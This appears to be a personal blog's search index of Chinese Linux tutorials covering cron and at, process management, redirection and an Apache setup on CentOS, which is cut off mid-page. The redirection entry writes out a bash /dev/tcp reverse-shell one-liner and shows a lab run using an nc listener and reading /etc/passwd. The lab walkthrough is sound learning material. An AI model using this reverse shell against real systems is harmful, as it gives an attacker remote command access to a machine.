<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>linux计划任务</title>
      <link href="/2025/08/06/linux%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/"/>
      <url>/2025/08/06/linux%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<p>一、计划任务简介</p><p>在特定时间自动执行预先设定的命令和脚本</p><p>比如：定期备份，服务器运维，数据更新</p><p>二、Linux计划任务工具</p><p>1.at</p><p>适用场景：一次性&#x2F;延迟任务</p><p>时间粒度：秒级</p><p>特点：简单、轻量、无需持久化守护进程</p><p>基本语法</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">at 【选项】 时间表达式</span><br><span class="line"></span><br><span class="line">at支持灵活的时间表述</span><br><span class="line">now <span class="comment"># 立即执行</span></span><br><span class="line">now + 5min <span class="comment"># 5分钟后</span></span><br><span class="line">02:30 tomorrow/today <span class="comment"># 次日2:30</span></span><br><span class="line">2025-12-31 23:59 <span class="comment"># 绝对时间</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#示例</span></span><br><span class="line">at now +5 minutes</span><br><span class="line"></span><br><span class="line"><span class="comment">#ctrl+d用于提交任务</span></span><br><span class="line"><span class="comment">#每个任务都有一个任务ID</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看所有待执行任务</span></span><br><span class="line">atq</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除任务</span></span><br><span class="line">atrm ID</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看任务内容</span></span><br><span class="line">at -C ID</span><br></pre></td></tr></table></figure><p>2.cron</p><p>适用场景：周期性任务</p><p>时间粒度：分钟级</p><p>特点：复杂，需长期运行守护进程</p><p>①cron核心功能</p><p>cron用于执行周期性任务</p><p>适用于以下场景：</p><ul><li>定时备份：每日&#x2F;每周自动备份数据。</li><li>日志清理：定时删除过期日志文件。</li><li>数据同步：每小时同步服务器间数据。</li><li>监控报警：检测服务状态并发送通知。</li></ul><p>②配置文件</p><p>cron有一个配置文件，是cron的编辑模板，路径为&#x2F;etc&#x2F;crontab</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@study ~]# <span class="built_in">cat</span> /etc/crontab</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">PATH=/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">MAILTO=root</span><br><span class="line"></span><br><span class="line"><span class="comment"># For details see man 4 crontabs</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Example of job definition:</span></span><br><span class="line"><span class="comment"># .---------------- minute (0 - 59)</span></span><br><span class="line"><span class="comment"># |  .------------- hour (0 - 23)</span></span><br><span class="line"><span class="comment"># |  |  .---------- day of month (1 - 31)</span></span><br><span class="line"><span class="comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span><br><span class="line"><span class="comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span><br><span class="line"><span class="comment"># |  |  |  |  |</span></span><br><span class="line"><span class="comment"># *  *  *  *  * user-name  command to be executed</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#minute表示分钟</span></span><br><span class="line"><span class="comment">#hour表示小时</span></span><br><span class="line"><span class="comment">#day of month表示一个月当中第几天</span></span><br><span class="line"><span class="comment">#munth表示第几个月</span></span><br><span class="line"><span class="comment">#day of week表示一周的第几天</span></span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line">10 2 * 7 2 /etc/bin/systemctl restart httpd</span><br><span class="line">表示7月份中每周二凌晨2点10分执行重启apache服务</span><br></pre></td></tr></table></figure><p>③管理命令</p><p>crontab -e：编辑任务</p><p>打开当前用户的~&#x2F;.crontab文件，支持bim编辑器，用于添加、修改、删除个人定时任务</p><p>crontab -l：列出任务</p><p>显示当前用户的所有计划任务</p><p>crontab -r：删除任务</p><p>永久删除当前用户的所有计划任务</p><p>crontab -u username：管理其他用户</p><p>用于查看&#x2F;编辑其他用户的计划任务</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux进程管理</title>
      <link href="/2025/08/06/linux%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"/>
      <url>/2025/08/06/linux%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="一、进程简介"><a href="#一、进程简介" class="headerlink" title="一、进程简介"></a>一、进程简介</h1><h2 id="1-进程是什么"><a href="#1-进程是什么" class="headerlink" title="1.进程是什么"></a>1.进程是什么</h2><ul><li>程序在启动时、命令在执行时或服务在运行时会产生进程，产生一个或多个，这些进程来完成程序、命令或服务，所以进程是正在执行的程序的实例。</li></ul><h2 id="2-程序和进程"><a href="#2-程序和进程" class="headerlink" title="2.程序和进程"></a>2.程序和进程</h2><ul><li>程序： 是一组静态的指令代码，存储在磁盘上的文件中。它本身是“死的”，不占用系统资源（除了存储空间）。</li><li>进程： 是程序被加载到内存中开始运行后的动态实体。它是“活的”，需要操作系统为其分配和管理各种资源才能执行。</li></ul><h2 id="3-进程的状态"><a href="#3-进程的状态" class="headerlink" title="3.进程的状态"></a>3.进程的状态</h2><p>进程在其生命周期中会处于不同的状态：</p><ul><li>新建（new）： 进程正在被创建。</li><li>就绪（Runable）： 进程已获得除CPU之外的所有必要资源，等待被操作系统调度执行。</li><li>运行（Running）： 进程正在CPU上执行其指令。</li><li>阻塞&#x2F;等待（Stopped）： 进程因等待某个事件（如I&#x2F;O操作完成、信号量资源）而暂停执行。</li><li>终止&#x2F;退出： 进程执行完毕或被强制终止，等待操作系统回收其资源。</li><li>僵尸态（Zombie）：子进程先结束，但是父进程没有回收子进程。</li></ul><h2 id="4-进程PID"><a href="#4-进程PID" class="headerlink" title="4.进程PID"></a>4.进程PID</h2><p>每个进程由唯一的一个非负整数来标识，从1开始分配，通过PID能精确定位到具体进程。</p><p>PID的分配规则：</p><ul><li><p>取值范围</p><p>PID从 1 开始分配（系统启动后的第一个进程是 init 或 systemd ，PID&#x3D;1）。</p><p>最大PID值由内核参数 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;pid_max 定义（默认通常为 32768 ）。</p><p>当PID达到最大值时，会循环使用已释放的PID（但不会重复分配给仍在运行的进程）。</p></li><li><p>回收机制</p></li></ul><p>​       进程终止后，其PID会被释放，供后续新进程使用</p><p>PID的特殊角色：</p><ul><li><p>PID&#x3D;1（systemd进程）</p><p>系统启动后的第一个进程，负责启动和管理其他所有用户进程。</p><p>如果PID&#x3D;1的进程终止，系统会触发内核恐慌（Kernel Panic）并崩溃。</p></li><li><p>父进程PID（PPID）</p><p>每个进程（除Init）都有父进程（Parent Process），父进程的PID称为 PPID。</p></li></ul><h2 id="5-进程字段解析"><a href="#5-进程字段解析" class="headerlink" title="5.进程字段解析"></a>5.进程字段解析</h2><ul><li>PID：进程 ID</li><li>PPID：父进程 ID</li><li>USER：进程所有者</li><li>%CPU：CPU 占用率</li><li>%MEM：内存占用率</li><li>VSZ：虚拟内存大小（KB）</li><li>RSS：物理内存大小（KB）</li><li>TTY：关联的终端</li><li>STAT：进程状态（如 S &#x3D;睡眠， R &#x3D;运行）</li><li>START：进程启动时间</li><li>TIME：累计 CPU 时间</li><li>COMMAND：启动命令（ [] 表示内核线程）</li></ul><h1 id="二、进程管理"><a href="#二、进程管理" class="headerlink" title="二、进程管理"></a>二、进程管理</h1><p>进程管理可以通过ps、top、kill来进行管理。</p><h2 id="1-ps"><a href="#1-ps" class="headerlink" title="1.ps"></a>1.ps</h2><p>ps是linux中查看当前系统进程状态的工具，用于静态查看进程，显示进程的详细信息，如：PID、CPU、运行时间、进程状态等等。</p><p>①基本语法：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps 【选项】</span><br><span class="line"></span><br><span class="line"><span class="comment">#常用参数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#显示所有进程（包括其他用户进程）</span></span><br><span class="line">-e或-A </span><br><span class="line"><span class="comment">#显示所有终端进程（除会话领导者）</span></span><br><span class="line">-a</span><br><span class="line"><span class="comment">#显示不关联终端的进程（如守护进程）</span></span><br><span class="line">-x</span><br><span class="line"><span class="comment">#显示指定用户的进程（如-u root）</span></span><br><span class="line">-u</span><br><span class="line"><span class="comment">#显示指定字段</span></span><br><span class="line">-o</span><br></pre></td></tr></table></figure><p>②常用搭配：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#显示所有进程详细信息，BSD风格</span></span><br><span class="line">ps aux</span><br><span class="line"></span><br><span class="line"><span class="comment">#显示所有进程完整信息，Unix风格</span></span><br><span class="line">ps -ef</span><br><span class="line"></span><br><span class="line"><span class="comment">#显示pid、用户、cpu占用、内存占用，按照cpu降序</span></span><br><span class="line">ps -eo pid,user,%cpu,%mem,cmd --<span class="built_in">sort</span>=-%cpu | <span class="built_in">head</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#搭配grep来指定要显示内容</span></span><br><span class="line"><span class="comment">#显示httpd进程</span></span><br><span class="line">ps aux | grep httpd</span><br></pre></td></tr></table></figure><h2 id="2-top"><a href="#2-top" class="headerlink" title="2.top"></a>2.top</h2><p>top是linux中最常用的实时系统监控工具，用于动态显示进程资源占用和系统整体状态，提供交互式操作，用户能够快速分析性能瓶颈</p><p>①基础语法</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#启动top</span></span><br><span class="line">top</span><br><span class="line"></span><br><span class="line"><span class="comment">#退出top</span></span><br><span class="line">q或Ctrl+C</span><br></pre></td></tr></table></figure><p>②界面解析</p><p>top 界面分为 摘要区（系统概览）和 进程列表区（实时进程信息）</p><p>上半部分（系统概览）<br>下半部分（进程列表）</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250806152548546.png"></p><p>③交互式命令</p><ul><li>k：终止进程（输入 PID，再输入信号，默认 SIGTERM ）。</li><li>r：调整进程优先级（输入 PID，再输入 Nice 值）。</li><li>P：按 CPU 使用率排序。</li><li>M：按内存使用率排序。</li><li>T：按运行时间排序。</li><li>N：按 PID 排序。</li><li>z：切换颜色高亮显示。</li><li>c：显示完整命令路径。</li><li>1：展开显示每个 CPU 核心的负载。</li><li>h：查看帮助信息。</li><li>空格：立即刷新界面。</li></ul><h2 id="3-kill"><a href="#3-kill" class="headerlink" title="3.kill"></a>3.kill</h2><p>kill命令可以用于刷新或者杀死进程</p><p>①信号控制</p><p>kill命令可以加上不同信号来完成对进程的不同操作</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看所有信号</span></span><br><span class="line"><span class="built_in">kill</span> -l</span><br><span class="line"></span><br><span class="line">[root@study 桌面]# <span class="built_in">kill</span> -l</span><br><span class="line"> 1) SIGHUP 2) SIGINT 3) SIGQUIT 4) SIGILL 5) SIGTRAP</span><br><span class="line"> 6) SIGABRT 7) SIGBUS 8) SIGFPE 9) SIGKILL10) SIGUSR1</span><br><span class="line">11) SIGSEGV12) SIGUSR213) SIGPIPE14) SIGALRM15) SIGTERM</span><br><span class="line">16) SIGSTKFLT17) SIGCHLD18) SIGCONT19) SIGSTOP20) SIGTSTP</span><br><span class="line">21) SIGTTIN22) SIGTTOU23) SIGURG24) SIGXCPU25) SIGXFSZ</span><br><span class="line">26) SIGVTALRM27) SIGPROF28) SIGWINCH29) SIGIO30) SIGPWR</span><br><span class="line">31) SIGSYS34) SIGRTMIN35) SIGRTMIN+136) SIGRTMIN+237) SIGRTMIN+3</span><br><span class="line">38) SIGRTMIN+439) SIGRTMIN+540) SIGRTMIN+641) SIGRTMIN+742) SIGRTMIN+8</span><br><span class="line">43) SIGRTMIN+944) SIGRTMIN+1045) SIGRTMIN+1146) SIGRTMIN+1247) SIGRTMIN+13</span><br><span class="line">48) SIGRTMIN+1449) SIGRTMIN+1550) SIGRTMAX-1451) SIGRTMAX-1352) SIGRTMAX-12</span><br><span class="line">53) SIGRTMAX-1154) SIGRTMAX-1055) SIGRTMAX-956) SIGRTMAX-857) SIGRTMAX-7</span><br><span class="line">58) SIGRTMAX-659) SIGRTMAX-560) SIGRTMAX-461) SIGRTMAX-362) SIGRTMAX-2</span><br><span class="line">63) SIGRTMAX-164) SIGRTMAX</span><br></pre></td></tr></table></figure><p>总共64种信号</p><p>②常用信号</p><ul><li>1：SIGHUP (重载配置)&#x2F;重刷新一个进程，主要用户服务的刷新</li><li>9：SIGKILL (强制终止)&#x2F;杀掉一个进程，但不杀掉其子进程（centos7）</li><li>15：SIGTERM (正常终止)&#x2F;杀掉进程及其子进程</li><li>18：SIGCONT (恢复执行)</li><li>19：SIGSTOP (暂停)&#x2F;暂停一个进程</li></ul><p>用法</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#杀死进程PID位1234的进程</span></span><br><span class="line"><span class="built_in">kill</span> -9 1234</span><br></pre></td></tr></table></figure><p>PID为1的进程为系统进程，别使用kill进行杀死</p><h1 id="三、作业控制"><a href="#三、作业控制" class="headerlink" title="三、作业控制"></a>三、作业控制</h1><p>linux可以在一个终端中管理多个任务进程(这些进程称之为job)。有些进程会占用终端运行很久或是一直占用终端，那么想要运行第二进程就无法操作了，所以进程可以放到后台执行，这样就不影响在同一个终端运行第二个进程了</p><h2 id="前后台管理"><a href="#前后台管理" class="headerlink" title="前后台管理"></a>前后台管理</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用sleep命令开启占用终端</span></span><br><span class="line"><span class="built_in">sleep</span> 10000&amp;</span><br><span class="line"></span><br><span class="line"><span class="comment">#‘&amp;’表示将sleep挂到后台运行，这样救不占用终端</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看后台运行作业</span></span><br><span class="line"><span class="built_in">jobs</span> -l</span><br><span class="line">[root@study 桌面]# <span class="built_in">jobs</span> -l</span><br><span class="line">[1]+  6659 运行中               <span class="built_in">sleep</span> 10000 &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment">#作业调度</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将后台任务调度到前台</span></span><br><span class="line"><span class="built_in">fg</span> %1 </span><br><span class="line"><span class="comment">#将后台暂停任务运行</span></span><br><span class="line"><span class="built_in">bg</span> %1</span><br><span class="line"></span><br><span class="line"><span class="comment">#%1表示作业号为1的作业</span></span><br><span class="line"><span class="comment">#用kill杀死时必须加上%1</span></span><br><span class="line"><span class="comment">#如果是kill 1表示杀死系统进程，谨慎操作</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux重定向与bash反弹</title>
      <link href="/2025/08/05/%E9%87%8D%E5%AE%9A%E5%90%91%E4%B8%8Ebash%E5%8F%8D%E5%BC%B9/"/>
      <url>/2025/08/05/%E9%87%8D%E5%AE%9A%E5%90%91%E4%B8%8Ebash%E5%8F%8D%E5%BC%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="一、重定向"><a href="#一、重定向" class="headerlink" title="一、重定向"></a>一、重定向</h1><h2 id="1-文件描述符（fd）"><a href="#1-文件描述符（fd）" class="headerlink" title="1.文件描述符（fd）"></a>1.文件描述符（fd）</h2><p>在linux系统中，文件描述符是一个非负整数（0、1、2、3……），它是用于唯一标识一个进程打开的文件、管道、网络连接或其他I&#x2F;O资源。</p><h2 id="2-标准流"><a href="#2-标准流" class="headerlink" title="2.标准流"></a>2.标准流</h2><p>linux中，每个进程会分配三个标准流，标准输入流、标准输出流、错误输出流，这三个流以三个不同的文件描述符进行标识。</p><p>①标准输入（stdin，fd 0）</p><p>  如键盘输入一个a</p><p>②标准输出（stdout，fd 1）</p><p>  如屏幕显示一个a</p><p>③错误输出（stderr，fd 2）</p><p>  如屏幕显示一个b</p><h2 id="3-重定向是什么"><a href="#3-重定向是什么" class="headerlink" title="3.重定向是什么"></a>3.重定向是什么</h2><p>重定向就是可以将一个输入或输出重定向到另一个文件当中</p><p>这里引入一个概念——-管道符，管道符的作用就是将前一个指令的输出作为后一个指令的输入，常用的管道符如:</p><p>&lt;</p><p>&lt;&lt;</p><p>|</p><p>&amp;</p><p>举个例子</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#当输入</span></span><br><span class="line"><span class="built_in">echo</span> 123 &gt; 123.txt</span><br><span class="line">123会输入到123.txt当中，而不是回显到终端</span><br></pre></td></tr></table></figure><h1 id="二、重定向案例"><a href="#二、重定向案例" class="headerlink" title="二、重定向案例"></a>二、重定向案例</h1><h2 id="1-正确和错误都输入到相同位置"><a href="#1-正确和错误都输入到相同位置" class="headerlink" title="1.正确和错误都输入到相同位置"></a>1.正确和错误都输入到相同位置</h2><p>首先，我们新建一个目录，&#x2F;test1&#x2F;123</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /test1/123</span><br></pre></td></tr></table></figure><p>然后输入以下内容</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> /test1 /test2</span><br><span class="line"><span class="comment">#正常返回这样</span></span><br><span class="line">[root@study /]# <span class="built_in">ls</span> /test1 /test2</span><br><span class="line"><span class="built_in">ls</span>: 无法访问<span class="string">&#x27;/test2&#x27;</span>: 没有那个文件或目录</span><br><span class="line">/test1:</span><br><span class="line">123</span><br><span class="line"></span><br><span class="line"><span class="comment">#现在我们输入</span></span><br><span class="line"><span class="built_in">ls</span> /test1 /test2 &amp;&gt; 456.txt</span><br><span class="line"><span class="built_in">cat</span> 456.txt</span><br><span class="line"><span class="comment">#则返回</span></span><br><span class="line">[root@study /]# <span class="built_in">ls</span> /test1 /test2 &amp;&gt; 456.txt</span><br><span class="line">[root@study /]# <span class="built_in">cat</span> 456.txt</span><br><span class="line"><span class="built_in">ls</span>: 无法访问<span class="string">&#x27;/test2&#x27;</span>: 没有那个文件或目录</span><br><span class="line">/test1:</span><br><span class="line">123</span><br></pre></td></tr></table></figure><p>正确的输出和错误的输出已经保存在456.txt文件里面了</p><h2 id="2-将正确的输出和错误的输出重定向到不同文件"><a href="#2-将正确的输出和错误的输出重定向到不同文件" class="headerlink" title="2.将正确的输出和错误的输出重定向到不同文件"></a>2.将正确的输出和错误的输出重定向到不同文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> /test1 /test2 1&gt; output.txt 2&gt; errorput.txt</span><br><span class="line"></span><br><span class="line">[root@study /]# <span class="built_in">ls</span> /test1 /test2 1&gt; output.txt 2&gt; errorput.txt</span><br><span class="line">[root@study /]# <span class="built_in">cat</span> output.txt </span><br><span class="line">/test1:</span><br><span class="line">123</span><br><span class="line">[root@study /]# <span class="built_in">cat</span> errorput.txt </span><br><span class="line"><span class="built_in">ls</span>: 无法访问<span class="string">&#x27;/test2&#x27;</span>: 没有那个文件或目录</span><br></pre></td></tr></table></figure><p>可以看到指向了不同的文件</p><h2 id="3-将错误输出合并到正确输出，再一起重定向到文件"><a href="#3-将错误输出合并到正确输出，再一起重定向到文件" class="headerlink" title="3.将错误输出合并到正确输出，再一起重定向到文件"></a>3.将错误输出合并到正确输出，再一起重定向到文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> /test1 /test2 &gt; 123.txt 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">[root@study /]# <span class="built_in">ls</span> /test1 /test2 &gt; 123.txt 2&gt;&amp;1</span><br><span class="line">[root@study /]# <span class="built_in">cat</span> 123.txt</span><br><span class="line"><span class="built_in">ls</span>: 无法访问<span class="string">&#x27;/test2&#x27;</span>: 没有那个文件或目录</span><br><span class="line">/test1:</span><br><span class="line">123</span><br></pre></td></tr></table></figure><p>可以看到，进行合并并且指向了123.txt文件</p><p>这里的方式和案例1的结果其实差不多，这里的&amp;1标识的是文件标识符（fd），不是文件1，所以在进行合并的时候必须写上&amp;</p><h1 id="三、bash反弹"><a href="#三、bash反弹" class="headerlink" title="三、bash反弹"></a>三、bash反弹</h1><h2 id="1-shell是什么"><a href="#1-shell是什么" class="headerlink" title="1.shell是什么"></a>1.shell是什么</h2><p>shell就是一种解释器，用于用户和内核交互的桥梁，计算机只能读懂二进制语言，读不懂人类语言，所以需要一个解释器去进行翻译，比如你在终端输入一个ls，那么你的shell就将这个命令翻译为二进制，计算机内核才能读懂，才能处理你的命令</p><h2 id="2-bash是什么"><a href="#2-bash是什么" class="headerlink" title="2.bash是什么"></a>2.bash是什么</h2><p>bash就是shell的一种类型，是shell的具体实现，你的操作系统终端输入命令的地方就是bsah，但是bash不仅仅只能解释命令，如：ls、cat、vim等，它也能执行复杂流程，如运行脚本</p><h2 id="3-反弹bash"><a href="#3-反弹bash" class="headerlink" title="3.反弹bash"></a>3.反弹bash</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.x.x/xxxx 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>命令解释</p><ul><li>bash -i</li></ul><p>打开一个交互的bash，就是命令行</p><ul><li>&#x2F;dev&#x2F;tcp&#x2F;</li></ul><p>linux中的特殊设备，打开这个文件相当于发送一个socket调用，建立socket连接，后续在这个连接中传输数据</p><ul><li>&#x2F;dev&#x2F;tcp&#x2F;192.168.x.x&#x2F;xxxx</li></ul><p>向192.168.x.x:xxxx发起连接</p><ul><li>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.x.x&#x2F;xxxx</li></ul><p>将正确输出和错误输重定向到这个连接</p><ul><li>0&gt;&amp;1</li></ul><p>将标准输入与正确输出合并，并一起重定向到这个连接</p><h2 id="4-实操"><a href="#4-实操" class="headerlink" title="4.实操"></a>4.实操</h2><p>实验机：kali、centos8</p><p>①在kali上，使用nc工具监听1234端口（端口可以自定义）</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lnvp 1324</span><br><span class="line"><span class="comment">#正常返回这个</span></span><br><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# nc -lnvp 1234 </span><br><span class="line">listening on [any] 1234 ...</span><br></pre></td></tr></table></figure><p>②在centos上，执行反弹命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#首先查看kali的ip</span></span><br><span class="line">ifconfig</span><br><span class="line"></span><br><span class="line"><span class="comment">#在centos上输入，这里的ip地址输入kali的地址，端口输入你监听的端口</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.x.x/xxxx 0&gt;&amp;1</span><br><span class="line"><span class="comment">#再次返回到kali，出现以下bash表示成功</span></span><br><span class="line">                                                                             </span><br><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# nc -lnvp 1234 </span><br><span class="line">listening on [any] 1234 ...</span><br><span class="line">connect to [192.168.18.169] from (UNKNOWN) [192.168.18.168] 42486</span><br><span class="line">[root@study /]# </span><br></pre></td></tr></table></figure><p>③试着执行命令，如查看&#x2F;etc&#x2F;passwd</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure><p>到此，本章内容结束！！！</p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux搭建apache服务器</title>
      <link href="/2025/08/04/linux%E6%90%AD%E5%BB%BAapache%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2025/08/04/linux%E6%90%AD%E5%BB%BAapache%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="一、搭建环境"><a href="#一、搭建环境" class="headerlink" title="一、搭建环境"></a>一、搭建环境</h1><p>操作系统：CentOS 8</p><p>服务器：apache</p><p>镜像源：<a href="https://mirrors.huaweicloud.com/repository/conf/CentOS-8-reg.repo">https://mirrors.huaweicloud.com/repository/conf/CentOS-8-reg.repo</a></p><h1 id="二、搭建步骤"><a href="#二、搭建步骤" class="headerlink" title="二、搭建步骤"></a>二、搭建步骤</h1><h2 id="1-下载镜像"><a href="#1-下载镜像" class="headerlink" title="1.下载镜像"></a>1.下载镜像</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo https://mirrors.huaweicloud.com/repository/conf/CentOS-8-reg.repo</span><br></pre></td></tr></table></figure><h2 id="2-下载apache服务"><a href="#2-下载apache服务" class="headerlink" title="2.下载apache服务"></a>2.下载apache服务</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#下载apache</span></span><br><span class="line">yum install httpd</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装完成后，开启apache服务</span></span><br><span class="line">systemctl start httpd</span><br><span class="line"></span><br><span class="line"><span class="comment">#检查状态，出现如下页面证明成功开启</span></span><br><span class="line">systemctl status httpd</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250804154607959.png"></p><h2 id="3-apache配置文件介绍"><a href="#3-apache配置文件介绍" class="headerlink" title="3.apache配置文件介绍"></a>3.apache配置文件介绍</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在下载apache时，会自动生成apache配置文件</span></span><br><span class="line"><span class="comment">#检查配置文件</span></span><br><span class="line"><span class="comment">#apache主配置文件，路径为/etc/httpd/conf/httpd.conf</span></span><br><span class="line"><span class="comment">#apache虚拟主机配置文件，路径为/etc/httpd/conf.d</span></span><br><span class="line"><span class="comment">#apache自定义配置文件，存放在虚拟主机配置文件目录下，如：/etc/httpd/conf.d/mywebsite.conf</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#可以检查系统新增系统服务，验证apache服务</span></span><br><span class="line">systemctl list-unit-files | grep http</span><br><span class="line"></span><br><span class="line">[root@localhost /]# systemctl list-unit-files | grep http</span><br><span class="line">httpd.service                              disabled </span><br><span class="line">httpd@.service                             disabled </span><br><span class="line">httpd.socket                               disabled </span><br><span class="line"></span><br><span class="line"><span class="comment">#检查新增的apache进程</span></span><br><span class="line">ps aux | grep httpd</span><br><span class="line"></span><br><span class="line">[root@localhost /]# ps aux | grep httpd</span><br><span class="line">root      32866  0.0  1.3 273860 10700 ?        Ss   15:42   0:00 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">apache    32870  0.0  1.0 286076  8244 ?        S    15:42   0:00 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">apache    32872  0.0  1.1 1802624 9512 ?        Sl   15:42   0:00 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">apache    32873  0.0  1.6 1933752 13600 ?       Sl   15:42   0:00 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">apache    32876  0.0  1.1 1802624 9512 ?        Sl   15:42   0:00 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">root      33313  0.0  0.1  12320   992 pts/0    S+   15:56   0:00 grep --color=auto httpd</span><br><span class="line"></span><br><span class="line"><span class="comment">#检查新增日志文件</span></span><br><span class="line"><span class="built_in">ls</span> -l /var/log/httpd</span><br><span class="line"></span><br><span class="line">[root@localhost /]# <span class="built_in">ls</span> -l /var/log/httpd</span><br><span class="line">总用量 4</span><br><span class="line">-rw-r--r--. 1 root root    0 8月   4 15:42 access_log</span><br><span class="line">-rw-r--r--. 1 root root 1036 8月   4 15:42 error_log</span><br><span class="line"></span><br><span class="line"><span class="comment">#检查新增用户和组</span></span><br><span class="line">grep apache /etc/passwd</span><br><span class="line">grep apache /etc/group</span><br><span class="line"></span><br><span class="line">[root@localhost /]# grep apache /etc/group</span><br><span class="line">apache:x:48:</span><br><span class="line">[root@localhost /]# grep apache /etc/passwd</span><br><span class="line">apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin</span><br></pre></td></tr></table></figure><h2 id="4-搭建静态页面"><a href="#4-搭建静态页面" class="headerlink" title="4.搭建静态页面"></a>4.搭建静态页面</h2><p>以上我们已经搭建好apache服务，现在需要利用apache服务来搭建一个自己的网站</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#首先，需要将静态页面保存到apache的网站根目录/var/www/html下，名为index.html</span><br><span class="line">#以下是我自己的静态页面代码</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试页面<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: <span class="string">&#x27;Segoe UI&#x27;</span>, Tahoma, Geneva, Verdana, sans-serif;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(<span class="number">135deg</span>, <span class="number">#f5f7fa</span> <span class="number">0%</span>, <span class="number">#c3cfe2</span> <span class="number">100%</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">justify-content</span>: center;</span></span><br><span class="line"><span 